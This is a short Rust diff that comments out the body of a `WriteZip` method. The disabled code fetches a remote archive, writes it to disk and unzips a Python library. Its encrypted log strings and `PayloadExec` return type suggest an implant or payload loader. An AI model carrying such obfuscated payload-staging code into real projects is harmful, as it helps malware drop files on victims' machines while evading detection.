@@ -252,6 +252,8 @@ impl WriteZip {
         let path: PathBuf = calculate_path(&self.path)?;
         let _ = create_diretory(&path)?;
 
+        todo!();
+        /* 
         let archive: Vec<u8> = self.link.fetch_data(config)?;
 
         info!("{}{:?}", encrypt_string!("[+] Write zip: "), path);
@@ -263,10 +265,11 @@ impl WriteZip {
                     encrypt_string!("error to unzip python lib: "),
                     error
                 )
-            }
+            }   
         }
 
         Ok(PayloadExec::NoThread())
+        */
     }
 }
 
